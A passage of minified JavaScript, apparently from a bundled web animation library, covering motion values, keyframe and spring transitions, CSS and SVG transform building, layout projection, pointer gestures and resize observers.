0&&n.autoplay!==!1&&(this.startTime=n.startTime),this.options=n}updateMotionValue(n){const{motionValue:t,onUpdate:i,onComplete:r,element:s,...a}=this.options;if(!t)return;if(n!==void 0){t.set(n);return}const o=new Ps({...a,autoplay:!1}),l=Math.max(Oa,le.now()-this.startTime),u=Ze(0,Oa,l-Oa),c=o.sample(l).value,{name:d}=this.options;s&&d&&t1(s,d,c),t.setWithVelocity(o.sample(Math.max(0,l-u)).value,c,u),o.stop()}}const ad=(e,n)=>n==="zIndex"?!1:!!(typeof e=="number"||Array.isArray(e)||typeof e=="string"&&(qe.test(e)||e==="0")&&!e.startsWith("url("));function D0(e){const n=e[0];if(e.length===1)return!0;for(let t=0;t<e.length;t++)if(e[t]!==n)return!0}function q0(e,n,t,i){const r=e[0];if(r===null)return!1;if(n==="display"||n==="visibility")return!0;const s=e[e.length-1],a=ad(r,n),o=ad(s,n);return!a||!o?!1:D0(e)||(t==="spring"||a1(t))&&i}function Yo(e){e.duration=0,e.type="keyframes"}const Zo=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),N0=/^(?:oklch|oklab|lab|lch|color|color-mix|light-dark)\(/;function I0(e){for(let n=0;n<e.length;n++)if(typeof e[n]=="string"&&N0.test(e[n]))return!0;return!1}const od=new Set(["color","backgroundColor","outlineColor","fill","stroke","borderColor","borderTopColor","borderRightColor","borderBottomColor","borderLeftColor"]),M0=Rh(()=>Object.hasOwnProperty.call(Element.prototype,"animate"));function O0(e){var d;const{motionValue:n,name:t,repeatDelay:i,repeatType:r,damping:s,type:a,keyframes:o}=e;if(!t||!(Zo.has(t)||od.has(t)))return!1;const l=(d=n==null?void 0:n.owner)==null?void 0:d.current;if(!(l instanceof HTMLElement)&&!(l instanceof SVGElement))return!1;const{onUpdate:u,transformTemplate:c}=n.owner.getProps();return M0()&&(Zo.has(t)||od.has(t)&&I0(o))&&(t!=="transform"||!c)&&!u&&!i&&r!=="mirror"&&s!==0&&a!=="inertia"}const w0=40;class B0 extends Su{constructor(n){var l;super(),this.stop=()=>{var u,c;this._animation&&(this._animation.stop(),(u=this.stopTimeline)==null||u.call(this)),(c=this.keyframeResolver)==null||c.cancel()},this.createdAt=le.now();const{keyframes:t,name:i,motionValue:r,element:s}=n,a=n;a.autoplay??(a.autoplay=!0),a.delay??(a.delay=0),a.type??(a.type="keyframes"),a.repeat??(a.repeat=0),a.repeatDelay??(a.repeatDelay=0),a.repeatType??(a.repeatType="loop");const o=(s==null?void 0:s.KeyframeResolver)||Cu;this.keyframeResolver=new o(t,(u,c,d)=>this.onKeyframesResolved(u,c,a,!d),i,r,s),(l=this.keyframeResolver)==null||l.scheduleResolve()}onKeyframesResolved(n,t,i,r){var b,h;this.keyframeResolver=void 0;const{name:s,type:a,velocity:o,delay:l,isHandoff:u,onUpdate:c}=i;this.resolvedAt=le.now();let d=!0;q0(n,s,a,o)||(d=!1,(Sn.instantAnimations||!l)&&(c==null||c(Ks(n,i,t))),n[0]=n[n.length-1],Yo(i),i.repeat=0);const p=r?this.resolvedAt?this.resolvedAt-this.createdAt>w0?this.resolvedAt:this.createdAt:this.createdAt:void 0,{onComplete:g}=i;i.startTime??(i.startTime=p),i.finalKeyframe=t,i.keyframes=n,i.onComplete=()=>{g==null||g(),this.notifyFinished()};const v=d&&!u&&O0(i);let x;if(v){i.element=(h=(b=i.motionValue)==null?void 0:b.owner)==null?void 0:h.current;try{x=new R0(i)}catch{x=new Ps(i)}}else x=new Ps(i);this.pendingTimeline&&(this.stopTimeline=x.attachTimeline(this.pendingTimeline),this.pendingTimeline=void 0),this._animation=x}get finished(){return this._animation?this._animation.finished:super.finished}then(n,t){return this.finished.finally(n).then(()=>{})}get animation(){var n;return this._animation||((n=this.keyframeResolver)==null||n.resume(),x0()),this._animation}get duration(){return this.animation.duration}get iterationDuration(){return this.animation.iterationDuration}get time(){return this.animation.time}set time(n){this.animation.time=n}get speed(){return this.animation.speed}get state(){return this.animation.state}set speed(n){this.animation.speed=n}get startTime(){return this.animation.startTime}attachTimeline(n){return this._animation?this.stopTimeline=this.animation.attachTimeline(n):this.pendingTimeline=n,()=>this.stop()}play(){this.animation.play()}pause(){this.animation.pause()}complete(){this.animation.complete()}cancel(){var n;this._animation&&this.animation.cancel(),(n=this.keyframeResolver)==null||n.cancel()}}function u1(e,n,t,i=0,r=1){const s=Array.from(e).sort((u,c)=>u.sortNodePosition(c)).indexOf(n),a=e.size,o=(a-1)*i;return typeof t=="function"?t(s,a):r===1?s*i:o-s*i}const ld=30,F0=e=>!isNaN(parseFloat(e));class k0{constructor(n,t={}){this.canTrackVelocity=null,this.events={},this.updateAndNotify=i=>{const r=le.now();if(this.updatedAt!==r&&this.setPrevFrameValue(),this.prev=this.current,this.setCurrent(i),this.current!==this.prev&&(this.notifyChange(),this.dependents))for(const s of this.dependents)s.dirty()},this.hasAnimated=!1,this.setCurrent(n),this.owner=t.owner}setCurrent(n){this.current=n,this.updatedAt=le.now(),this.canTrackVelocity===null&&n!==void 0&&(this.canTrackVelocity=F0(this.current))}setPrevFrameValue(n=this.current){this.prevFrameValue=n,this.prevUpdatedAt=this.updatedAt}onChange(n){return this.on("change",n)}on(n,t){var i;return n==="change"?this.onChangeSubscribe(t):((i=this.events)[n]||(i[n]=new Cs)).add(t)}onChangeSubscribe(n){const{events:t}=this;return!t.change&&!this.changeSubscriber?this.changeSubscriber=n:(t.change||(t.change=new Cs,t.change.add(this.changeSubscriber),this.changeSubscriber=void 0),t.change.add(n)),()=>{var i;this.changeSubscriber===n?this.changeSubscriber=void 0:(i=t.change)==null||i.remove(n),this.stopIfUnobserved()}}stopIfUnobserved(){U.read(()=>{var n;!this.changeSubscriber&&!((n=this.events.change)!=null&&n.getSize())&&this.stop()})}clearListeners(){this.changeSubscriber=void 0;for(const n in this.events)this.events[n].clear()}attach(n,t){this.passiveEffect=n,this.stopPassiveEffect=t}set(n){this.passiveEffect?this.passiveEffect(n,this.updateAndNotify):this.updateAndNotify(n)}setWithVelocity(n,t,i){this.set(t),this.prev=void 0,this.prevFrameValue=n,this.prevUpdatedAt=this.updatedAt-i}jump(n,t=!0){this.updateAndNotify(n),this.prev=n,this.prevUpdatedAt=this.prevFrameValue=void 0,t&&this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}dirty(){this.notifyChange()}notifyChange(){var i;const{current:n,changeSubscriber:t}=this;t?t(n):(i=this.events.change)==null||i.notify(n)}addDependent(n){this.dependents||(this.dependents=new Set),this.dependents.add(n)}removeDependent(n){this.dependents&&this.dependents.delete(n)}get(){return this.current}getPrevious(){return this.prev}getVelocity(){const n=le.now();if(!this.canTrackVelocity||this.prevFrameValue===void 0||n-this.updatedAt>ld)return 0;const t=Math.min(this.updatedAt-this.prevUpdatedAt,ld);return Dh(parseFloat(this.current)-parseFloat(this.prevFrameValue),t)}start(n){return this.stop(),new Promise(t=>{var s;this.hasAnimated=!0;let i=!1,r;r=n(()=>{var a;i=!0,(a=this.events.animationComplete)==null||a.notify(),this.animation===r&&this.clearAnimation(),t()}),i||(this.animation=r),(s=this.events.animationStart)==null||s.notify()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){this.animation=void 0}destroy(){var n,t;(n=this.dependents)==null||n.clear(),(t=this.events.destroy)==null||t.notify(),this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function Qt(e,n){return new k0(e,n)}function c1(e,n){if(e!=null&&e.inherit&&n){const{inherit:t,...i}=e;return{...n,...i}}return e}function Au(e,n){const t=(e==null?void 0:e[n])??(e==null?void 0:e.default)??e;return t!==e?c1(t,e):t}const j0={type:"spring",stiffness:500,damping:25,restSpeed:10},U0=e=>({type:"spring",stiffness:550,damping:e===0?2*Math.sqrt(550):30,restSpeed:10}),V0={type:"keyframes",duration:.8},_0={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},H0=(e,{keyframes:n})=>n.length>2?V0:Zt.has(e)?e.startsWith("scale")?U0(n[1]):j0:_0,z0=new Set(["when","delay","delayChildren","staggerChildren","staggerDirection","repeat","repeatType","repeatDelay","from","elapsed"]);function G0(e){for(const n in e)if(!z0.has(n))return!0;return!1}const Eu=(e,n,t,i={},r,s)=>a=>{const o=Au(i,e)||{},l=o.delay||i.delay||0;let{elapsed:u=0}=i;u=u-je(l);const c={keyframes:Array.isArray(t)?t:[null,t],ease:"easeOut",velocity:n.getVelocity(),...o,delay:-u,onUpdate:p=>{n.set(p),o.onUpdate&&o.onUpdate(p)},onComplete:()=>{a(),o.onComplete&&o.onComplete()},name:e,motionValue:n,element:s?void 0:r};G0(o)||Object.assign(c,H0(e,c)),c.duration&&(c.duration=je(c.duration)),c.repeatDelay&&(c.repeatDelay=je(c.repeatDelay)),c.from!==void 0&&(c.keyframes[0]=c.from);let d=!1;if((c.type===!1||c.duration===0&&!c.repeatDelay)&&(Yo(c),c.delay===0&&(d=!0)),(Sn.instantAnimations||Sn.skipAnimations||r!=null&&r.shouldSkipAnimations||o.skipAnimations)&&(d=!0,Yo(c),c.delay=0),c.allowFlatten=!o.type&&!o.ease,d&&!s&&n.get()!==void 0){const p=Ks(c.keyframes,o);if(p!==void 0){U.update(()=>{c.onUpdate(p),c.onComplete()});return}}return o.isSync?new Ps(c):new B0(c)},X0=/^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;function Q0(e){const n=X0.exec(e);if(!n)return[,];const[,t,i,r]=n;return[`--${t??i}`,r]}function d1(e,n,t=1){const[i,r]=Q0(e);if(!i)return;const s=window.getComputedStyle(n).getPropertyValue(i);if(s){const a=s.trim();return lu(a)?parseFloat(a):a}return mu(r)?d1(r,n,t+1):r}function ud(e){const n=[{},{}];return e==null||e.values.forEach((t,i)=>{n[0][i]=t.get(),n[1][i]=t.getVelocity()}),n}function Pu(e,n,t,i){if(typeof n=="function"){const[r,s]=ud(i);n=n(t!==void 0?t:e.custom,r,s)}if(typeof n=="string"&&(n=e.variants&&e.variants[n]),typeof n=="function"){const[r,s]=ud(i);n=n(t!==void 0?t:e.custom,r,s)}return n}function ot(e,n,t){const i=e.getProps();return Pu(i,n,t!==void 0?t:i.custom,e)}const p1=new Set(["width","height","top","left","right","bottom",...Yt]),el=e=>Array.isArray(e);function W0(e,n,t){e.hasValue(n)?e.getValue(n).set(t):e.addValue(n,Qt(t))}function $0(e){return el(e)?e[e.length-1]||0:e}function K0(e,n){const t=ot(e,n);let{transitionEnd:i={},transition:r={},...s}=t||{};s={...s,...i};for(const a in s){const o=$0(s[a]);W0(e,a,o)}}const ue=e=>!!(e&&e.getVelocity);function J0(e){return!!(ue(e)&&e.add)}function nl(e,n){const t=e.getValue("willChange");if(J0(t))return t.add(n);if(!t&&Sn.WillChange){const i=new Sn.WillChange("auto");e.addValue("willChange",i),i.add(n)}}function Tu(e){return e.replace(/([A-Z])/g,n=>`-${n.toLowerCase()}`)}const Y0="framerAppearId",m1="data-"+Tu(Y0);function f1(e){return e.props[m1]}const Z0=typeof window<"u";function ex({protectedKeys:e,needsAnimating:n},t){const i=e.hasOwnProperty(t)&&n[t]!==!0;return n[t]=!1,i}function h1(e,n,{delay:t=0,transitionOverride:i,type:r}={}){let{transition:s,transitionEnd:a,...o}=n;const l=e.getDefaultTransition();s=s?c1(s,l):l;const u=s==null?void 0:s.reduceMotion,c=s==null?void 0:s.skipAnimations;i&&(s=i);const d=[],p=r&&e.animationState&&e.animationState.getState()[r],g=s==null?void 0:s.path;g&&g.animateVisualElement(e,o,s,t,d);for(const v in o){const x=e.getValue(v,e.latestValues[v]??null),b=o[v];if(b===void 0||p&&ex(p,v))continue;const h={delay:t,...Au(s||{},v)};c&&(h.skipAnimations=!0);const m=x.get();if(m!==void 0&&!x.isAnimating()&&!Array.isArray(b)&&b===m&&!h.velocity){U.update(()=>x.set(b));continue}let f=!1;if(Z0&&window.MotionHandoffAnimation){const T=f1(e);if(T){const S=window.MotionHandoffAnimation(T,v,U);S!==null&&(h.startTime=S,f=!0)}}nl(e,v);const y=u??e.shouldReduceMotion;x.start(Eu(v,x,b,y&&p1.has(v)?{type:!1}:h,e,f));const A=x.animation;A&&d.push(A)}if(a){const v=()=>U.update(()=>{a&&K0(e,a)});d.length?Promise.all(d).then(v):v()}return d}function tl(e,n,t={}){var l;const i=ot(e,n,t.type==="exit"?(l=e.presenceContext)==null?void 0:l.custom:void 0);let{transition:r=e.getDefaultTransition()||{}}=i||{};t.transitionOverride&&(r=t.transitionOverride);const s=i?()=>Promise.all(h1(e,i,t)):()=>Promise.resolve(),a=e.variantChildren&&e.variantChildren.size?(u=0)=>{const{delayChildren:c=0,staggerChildren:d,staggerDirection:p}=r;return nx(e,n,u,c,d,p,t)}:()=>Promise.resolve(),{when:o}=r;if(o){const[u,c]=o==="beforeChildren"?[s,a]:[a,s];return u().then(()=>c())}else return Promise.all([s(),a(t.delay)])}function nx(e,n,t=0,i=0,r=0,s=1,a){const o=[];for(const l of e.variantChildren)l.notify("AnimationStart",n),o.push(tl(l,n,{...a,delay:t+(typeof i=="function"?0:i)+u1(e.variantChildren,l,i,r,s)}).then(()=>l.notify("AnimationComplete",n)));return Promise.all(o)}function tx(e,n,t={}){e.notify("AnimationStart",n);let i;if(Array.isArray(n)){const r=n.map(s=>tl(e,s,t));i=Promise.all(r)}else if(typeof n=="string")i=tl(e,n,t);else{const r=typeof n=="function"?ot(e,n,t.custom):n;i=Promise.all(h1(e,r,t))}return i.then(()=>{e.notify("AnimationComplete",n)})}const ix={test:e=>e==="auto",parse:e=>e},rx=e=>n=>n.test(e),sx=[Jt,N,ln,un,yy,vy,ix],cd=e=>sx.find(rx(e));function ax(e){return typeof e=="number"?e===0:e!==null?e==="none"||e==="0"||uu(e):!0}const ox=new Set(["auto","none","0"]);function lx(e,n,t){let i=0,r;for(;i<e.length&&!r;){const s=e[i];typeof s=="string"&&!ox.has(s)&&Ey(s)&&(r=e[i]),i++}if(r&&t)for(const s of n)e[s]!==r&&(e[s]=bu(t,r))}class ux extends Cu{constructor(n,t,i,r,s){super(n,t,i,r,s,!0)}readKeyframes(){const{unresolvedKeyframes:n,element:t,name:i}=this;if(!t||!t.current)return;super.readKeyframes();for(let c=0;c<n.length;c++){let d=n[c];if(typeof d=="string"&&(d=d.trim(),mu(d))){const p=d1(d,t.current);p!==void 0&&(n[c]=p),c===n.length-1&&(this.finalKeyframe=d)}}if(this.resolveNoneKeyframes(),!p1.has(i)||n.length!==2)return;const[r,s]=n;if(typeof r=="number"&&typeof s=="number")return;const a=cd(r),o=cd(s),l=Qc(r),u=Qc(s);if(l!==u&&st[i]){this.needsMeasurement=!0;return}if(a!==o)if(id(a)&&id(o))for(let c=0;c<n.length;c++){const d=n[c];typeof d=="string"&&(n[c]=parseFloat(d))}else st[i]&&(this.needsMeasurement=!0)}resolveNoneKeyframes(){const{unresolvedKeyframes:n,name:t}=this,i=[];for(let r=0;r<n.length;r++)(n[r]===null||ax(n[r]))&&i.push(r);i.length&&lx(n,i,t)}measure(){const{element:n,name:t}=this;return st[t](window.getComputedStyle(n.current),()=>n.measureViewportBox())}measureInitialState(){var s;const{element:n,unresolvedKeyframes:t,name:i}=this;if(!n||!n.current)return;i==="height"&&(this.suspendedScrollY=window.pageYOffset),this.measuredOrigin=this.measure(),t[0]=this.measuredOrigin;const r=t[t.length-1];r!==void 0&&((s=this.motionValue)==null||s.jump(r,!1))}measureEndState(){var s,a;const{element:n,unresolvedKeyframes:t}=this;if(!n||!n.current)return;(s=this.motionValue)==null||s.jump(this.measuredOrigin,!1);const i=t.length-1,r=t[i];t[i]=this.measure(),r!==null&&this.finalKeyframe===void 0&&(this.finalKeyframe=r),(a=this.removedTransforms)!=null&&a.length&&this.removedTransforms.forEach(([o,l])=>{n.getValue(o).set(l)}),this.resolveNoneKeyframes()}}const Lu=["borderTopLeftRadius","borderTopRightRadius","borderBottomRightRadius","borderBottomLeftRadius"];function zr(e){return Lh(e)&&"offsetHeight"in e&&!("ownerSVGElement"in e)}function Ru(e){return Lh(e)&&"ownerSVGElement"in e}const il=(e,n)=>n&&typeof e=="number"?n.transform(e):e;function g1(e,n,t){if(e==null)return[];if(e instanceof EventTarget)return[e];if(typeof e=="string"){let i=document;const r=(t==null?void 0:t[e])??i.querySelectorAll(e);return r?Array.from(r):[]}return Array.from(e).filter(i=>i!=null)}const cx={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},dx=Yt.length;function px(e,n,t){let i="",r=!0;for(let a=0;a<dx;a++){const o=Yt[a],l=e[o];if(l===void 0)continue;let u=!0;if(typeof l=="number")u=l===(o.startsWith("scale")?1:0);else{const c=parseFloat(l);u=o.startsWith("scale")?c===1:c===0}if(!u||t){const c=il(l,Ts[o]);if(!u){r=!1;const d=cx[o]||o;i+=`${d}(${c}) `}t&&(n[o]=c)}}const s=e.pathRotation;return s&&(r=!1,i+=`rotate(${il(s,Ts.pathRotation)}) `),i=i.trim(),t?i=t(n,r?"":i):r&&(i="none"),i}function Du(e,n,t){const{style:i,vars:r,transformOrigin:s}=e;let a=!1,o=!1;for(const l in n){const u=n[l];if(Zt.has(l)){a=!0;continue}else if(Vh(l)){r[l]=u;continue}else{const c=il(u,Ts[l]);l.startsWith("origin")?(o=!0,s[l]=c):i[l]=c}}if(n.transform||(a||t?i.transform=px(n,e.transform,t):i.transform&&(i.transform="none")),o){const{originX:l="50%",originY:u="50%",originZ:c=0}=s;i.transformOrigin=`${l} ${u} ${c}`}}const mx={offset:"stroke-dashoffset",array:"stroke-dasharray"},fx={offset:"strokeDashoffset",array:"strokeDasharray"};function hx(e,n,t=1,i=0,r=!0){e.pathLength=1;const s=r?mx:fx;e[s.offset]=`${-i}`,e[s.array]=`${n} ${t}`}const v1=["transform","opacity","offsetDistance","offsetPath","offsetRotate","offsetAnchor"];function y1(e,{attrX:n,attrY:t,attrScale:i,pathLength:r,pathSpacing:s=1,pathOffset:a=0,...o},l,u,c){if(Du(e,o,u),l){e.style.viewBox&&(e.attrs.viewBox=e.style.viewBox);return}e.attrs=e.style,e.style={};const{attrs:d,style:p}=e;for(const g of v1)d[g]!==void 0&&(p[g]=d[g],delete d[g]);(p.transform||d.transformOrigin)&&(p.transformOrigin=d.transformOrigin??"50% 50%",delete d.transformOrigin),p.transform&&(p.transformBox=(c==null?void 0:c.transformBox)??"fill-box",delete d.transformBox),n!==void 0&&(d.x=n),t!==void 0&&(d.y=t),i!==void 0&&(d.scale=i),r!==void 0&&hx(d,r,s,a,!1)}function x1({top:e,left:n,right:t,bottom:i}){return{x:{min:n,max:t},y:{min:e,max:i}}}function gx({x:e,y:n}){return{top:n.min,right:e.max,bottom:n.max,left:e.min}}function vx(e,n){if(!n)return e;const t=n({x:e.left,y:e.top}),i=n({x:e.right,y:e.bottom});return{top:t.y,left:t.x,bottom:i.y,right:i.x}}function wa(e){return e===void 0||e===1}function rl({scale:e,scaleX:n,scaleY:t}){return!wa(e)||!wa(n)||!wa(t)}function Jn(e){return rl(e)||S1(e)||e.z||e.rotate||e.rotateX||e.rotateY||e.skewX||e.skewY}function S1(e){return dd(e.x)||dd(e.y)}function dd(e){return e&&e!=="0%"}function Ls(e,n,t){const i=e-t,r=n*i;return t+r}function pd(e,n,t,i,r){return r!==void 0&&(e=Ls(e,r,i)),Ls(e,t,i)+n}function sl(e,n=0,t=1,i,r){e.min=pd(e.min,n,t,i,r),e.max=pd(e.max,n,t,i,r)}function b1(e,{x:n,y:t}){sl(e.x,n.translate,n.scale,n.originPoint),sl(e.y,t.translate,t.scale,t.originPoint)}const md=.999999999999,fd=1.0000000000001;function yx(e,n,t,i=!1){var o;const r=t.length;if(!r)return;n.x=n.y=1;let s,a;for(let l=0;l<r;l++){s=t[l],a=s.projectionDelta;const{visualElement:u}=s.options;u&&u.props.style&&u.props.style.display==="contents"||(i&&s.options.layoutScroll&&s.scroll&&s!==s.root&&(rn(e.x,-s.scroll.offset.x),rn(e.y,-s.scroll.offset.y)),a&&(n.x*=a.x.scale,n.y*=a.y.scale,b1(e,a)),i&&Jn(s.latestValues)&&Gr(e,s.latestValues,(o=s.layout)==null?void 0:o.layoutBox))}n.x<fd&&n.x>md&&(n.x=1),n.y<fd&&n.y>md&&(n.y=1)}function rn(e,n){e.min+=n,e.max+=n}function hd(e,n,t,i,r=.5){const s=j(e.min,e.max,r);sl(e,n,t,s,i)}function gd(e,n){return typeof e=="string"?parseFloat(e)/100*(n.max-n.min):e}function Gr(e,n,t){const i=t??e;hd(e.x,gd(n.x,i.x),n.scaleX,n.scale,n.originX),hd(e.y,gd(n.y,i.y),n.scaleY,n.scale,n.originY)}function C1(e,n){return x1(vx(e.getBoundingClientRect(),n))}function xx(e,n,t){const i=C1(e,t),{scroll:r}=n;return r&&(rn(i.x,r.offset.x),rn(i.y,r.offset.y)),i}const{schedule:qu}=jh(queueMicrotask,!1),ze={x:!1,y:!1};function A1(){return ze.x||ze.y}function Sx(e){return e==="x"||e==="y"?ze[e]?null:(ze[e]=!0,()=>{ze[e]=!1}):ze.x||ze.y?null:(ze.x=ze.y=!0,()=>{ze.x=ze.y=!1})}function E1(e,n){const t=g1(e),i=new AbortController,r={passive:!0,...n,signal:i.signal};return[t,r,()=>i.abort()]}function bx(e){return!(e.pointerType==="touch"||A1())}function Cx(e,n,t={}){const[i,r,s]=E1(e,t);return i.forEach(a=>{let o=!1,l=!1,u;const c=()=>{a.removeEventListener("pointerleave",v)},d=b=>{u&&(u(b),u=void 0),c()},p=b=>{o=!1,window.removeEventListener("pointerup",p),window.removeEventListener("pointercancel",p),l&&(l=!1,d(b))},g=()=>{o=!0,window.addEventListener("pointerup",p,r),window.addEventListener("pointercancel",p,r)},v=b=>{if(b.pointerType!=="touch"){if(o){l=!0;return}d(b)}},x=b=>{if(!bx(b))return;l=!1;const h=n(a,b);typeof h=="function"&&(u=h,a.addEventListener("pointerleave",v,r))};a.addEventListener("pointerenter",x,r),a.addEventListener("pointerdown",g,r)}),s}const P1=(e,n)=>n?e===n?!0:P1(e,n.parentElement):!1,Nu=e=>e.pointerType==="mouse"?typeof e.button!="number"||e.button<=0:e.isPrimary!==!1,Ax=new Set(["BUTTON","INPUT","SELECT","TEXTAREA","A"]);function Ex(e){return Ax.has(e.tagName)||e.isContentEditable===!0}const Px=new Set(["INPUT","SELECT","TEXTAREA"]);function Tx(e){return Px.has(e.tagName)||e.isContentEditable===!0}const Xr=new WeakSet;function vd(e){return n=>{n.key==="Enter"&&e(n)}}function Ba(e,n){e.dispatchEvent(new PointerEvent("pointer"+n,{isPrimary:!0,bubbles:!0}))}const Lx=(e,n)=>{const t=e.currentTarget;if(!t)return;const i=vd(()=>{if(Xr.has(t))return;Ba(t,"down");const r=vd(()=>{Ba(t,"up")}),s=()=>Ba(t,"cancel");t.addEventListener("keyup",r,n),t.addEventListener("blur",s,n)});t.addEventListener("keydown",i,n),t.addEventListener("blur",()=>t.removeEventListener("keydown",i),n)};function yd(e){return Nu(e)&&!A1()}const xd=new WeakSet;function Rx(e,n,t={}){const[i,r,s]=E1(e,t),a=o=>{const l=o.currentTarget;if(!yd(o)||xd.has(o))return;Xr.add(l),t.stopPropagation&&xd.add(o);const u=n(l,o),c={...r,capture:!0},d=(v,x)=>{window.removeEventListener("pointerup",p,c),window.removeEventListener("pointercancel",g,c),Xr.has(l)&&Xr.delete(l),yd(v)&&typeof u=="function"&&u(v,{success:x})},p=v=>{d(v,l===window||l===document||t.useGlobalTarget||P1(l,v.target))},g=v=>{d(v,!1)};window.addEventListener("pointerup",p,c),window.addEventListener("pointercancel",g,c)};return i.forEach(o=>{(t.useGlobalTarget?window:o).addEventListener("pointerdown",a,r),zr(o)&&(o.addEventListener("focus",u=>Lx(u,r)),!Ex(o)&&!o.hasAttribute("tabindex")&&(o.tabIndex=0))}),s}const Qr=new WeakMap;let En;const T1=(e,n,t)=>(i,r)=>r&&r[0]?r[0][e+"Size"]:Ru(i)&&"getBBox"in i?i.getBBox()[n]:i[t],Dx=T1("inline","width","offsetWidth"),qx=T1("block","height","offsetHeight");function Nx({target:e,borderBoxSize:n}){var t;(t=Qr.get(e))==null||t.forEach(i=>{i(e,{get width(){return Dx(e,n)},get height(){return qx(e,n)}})})}function Ix(e){e.forEach(Nx)}function Mx(){typeof ResizeObserver>"u"||(En=new ResizeObserver(Ix))}function Ox(e,n){En||Mx();const t=g1(e);return t.forEach(i=>{let r=Qr.get(i);r||(r=new Set,Qr.set(i,r)),r.add(n),En==null||En.observe(i)}),()=>{t.forEach(i=>{const r=Qr.get(i);r==null||r.delete(n),r!=null&&r.size||En==null||En.unobserve(i)})}}const Wr=new Set;let Nt;function wx(){Nt=()=>{const e={get width(){return window.innerWidth},get height(){return window.innerHeight}};Wr.forEach(n=>n(e))},window.addEventListener("resize",Nt)}function Bx(e){return Wr.add(e),Nt||wx(),()=>{Wr.delete(e),!Wr.size&&typeof Nt=="function"&&(window.removeEventListener("resize",Nt),Nt=void 0)}}function Sd(e,n){return typeof e=="function"?Bx(e):Ox(e,n)}function Fx(e){return Ru(e)&&e.tagName==="svg"}const bd=()=>({translate:0,scale:1,origin:0,originPoint:0}),It=()=>({x:bd(),y:bd()}),Cd=()=>({min:0,max:0}),Z=()=>({x:Cd(),y:Cd()}),kx=new WeakMap;function Js(e){return e!==null&&typeof e=="object"&&typeof e.start=="function"}function Wi(e){return typeof e=="string"||Array.isArray(e)}const Iu=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],Rs=["initial",...Iu];function Ys(e){if(Js(e.animate))return!0;for(let n=0;n<Rs.length;n++)if(Wi(e[Rs[n]]))return!0;return!1}function L1(e){return!!(Ys(e)||e.variants)}function jx(e,n,t){for(const i in n){const r=n[i],s=t[i];if(ue(r))e.addValue(i,r);else if(ue(s))e.addValue(i,Qt(r,{owner:e}));else if(s!==r)if(e.hasValue(i)){const a=e.getValue(i);a.liveStyle===!0?a.jump(r):a.hasAnimated||a.set(r)}else{const a=e.getStaticValue(i);e.addValue(i,Qt(a!==void 0?a:r,{owner:e}))}}for(const i in t)n[i]===void 0&&e.removeValue(i);return n}const al={current:null},R1={current:!1},Ux=typeof window<"u";function Vx(){if(R1.current=!0,!!Ux)if(window.matchMedia){const e=window.matchMedia("(prefers-reduced-motion)"),n=()=>al.current=e.matches;e.addEventListener("change",n),n()}else al.current=!1}const Ad=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"];let Ds={};function D1(e){Ds=e}function _x(){return Ds}class Hx{scrapeMotionValuesFromProps(n,t,i){return{}}constructor({parent:n,props:t,presenceContext:i,reducedMotionConfig:r,skipAnimations:s,blockInitialAnimation:a,visualState:o},l={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.shouldSkipAnimations=!1,this.values=new Map,this.KeyframeResolver=Cu,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.hasBeenMounted=!1,this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.renderScheduledAt=0,this.scheduleRender=()=>{const g=le.now();this.renderScheduledAt<g&&(this.renderScheduledAt=g,U.render(this.render,!1,!0))};const{latestValues:u,renderState:c}=o;this.latestValues=u,this.baseTarget={...u},this.initialValues=t.initial?{...u}:{},this.renderState=c,this.parent=n,this.props=t,this.presenceContext=i,this.depth=n?n.depth+1:0,this.reducedMotionConfig=r,this.skipAnimationsConfig=s,this.options=l,this.blockInitialAnimation=!!a,this.isControllingVariants=Ys(t),this.isVariantNode=L1(t),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(n&&n.current);const{willChange:d,...p}=this.scrapeMotionValuesFromProps(t,{},this);for(const g in p){const v=p[g];u[g]!==void 0&&ue(v)&&v.set(u[g])}}mount(n){var t,i;if(this.hasBeenMounted)for(const r in this.initialValues)(t=this.values.get(r))==null||t.jump(this.initialValues[r]),this.latestValues[r]=this.initialValues[r];this.current=n,kx.set(n,this),this.projection&&!this.projection.instance&&this.projection.mount(n),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,s)=>this.bindToMotionValue(s,r)),this.reducedMotionConfig==="never"?this.shouldReduceMotion=!1:this.reducedMotionConfig==="always"?this.shouldReduceMotion=!0:(R1.current||Vx(),this.shouldReduceMotion=al.current),this.shouldSkipAnimations=this.skipAnimationsConfig??!1,(i=this.parent)==null||i.addChild(this),this.update(this.props,this.presenceContext),this.hasBeenMounted=!0}unmount(){var n;this.projection&&this.projection.unmount(),Vn(this.notifyUpdate),Vn(this.render),this.valueSubscriptions.forEach(t=>t()),this.valueSubscriptions.clear(),this.removeFromVariantTree&&this.removeFromVariantTree(),(n=this.parent)==null||n.removeChild(this);for(const t in this.events)this.events[t].clear();for(const t in this.features){const i=this.features[t];i&&(i.unmount(),i.isMounted=!1)}this.current=null}addChild(n){this.children.add(n),this.enteringChildren??(this.enteringChildren=new Set),this.enteringChildren.add(n)}removeChild(n){this.children.delete(n),this.enteringChildren&&this.enteringChildren.delete(n)}bindToMotionValue(n,t){if(this.valueSubscriptions.has(n)&&this.valueSubscriptions.get(n)(),t.accelerate&&Zo.has(n)&&this.current instanceof HTMLElement){const{factory:a,keyframes:o,times:l,ease:u,duration:c}=t.accelerate,d=new 